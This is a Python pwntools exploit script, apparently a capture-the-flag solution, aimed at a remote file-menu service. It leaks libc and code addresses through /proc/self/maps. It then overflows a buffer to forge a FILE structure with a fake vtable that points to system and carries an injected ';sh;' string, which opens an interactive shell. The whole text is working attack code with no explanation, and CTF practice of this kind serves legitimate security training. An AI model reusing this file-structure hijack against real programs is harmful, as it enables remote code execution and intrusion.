from pwn import *

r = remote("csie.ctf.tw", 10144)
# r = remote("127.0.0.1", 8888)

def openfile(filename):
	r.recvuntil("choice :")
	r.sendline("1")
	r.recvuntil(":")
	r.sendline(filename)

def readfile():
	r.recvuntil("choice :")
	r.sendline("2")

def writefile():
	r.recvuntil("choice :")
	r.sendline("3")

def my_exit(data):
	r.recvuntil("choice :")
	r.sendline("4")
	r.recvuntil(":")
	r.sendline(data)


# leak libc base
openfile("/proc/self/maps")
readfile()
writefile()
r.recvuntil(":")
libc = int(r.recvuntil("-")[:-1], 16)
print("libc : " + hex(libc))

# leak code base
readfile()
writefile()
readfile()
writefile()
readfile()
writefile()
code = int(r.recvuntil("r-xp")[-30:-18], 16)
print("code : " + hex(code))

# debug
# raw_input('aaa')

buf = code + 0x202040
lock = buf + 0x500
# put fake vtable right after FILE pointer *fp
vtable_addr = buf + 0x108
system = libc + 0x45390
payload = "A" * 0x8 + ";sh;aaaa" + "A" * 0x78 + p64(lock)
payload = payload.ljust(0xd8, "A") + p64(vtable_addr)
payload = payload.ljust(0x100, "A") + p64(buf)
payload += "A" * 0x10 + p64(system)

my_exit(payload)

r.interactive()

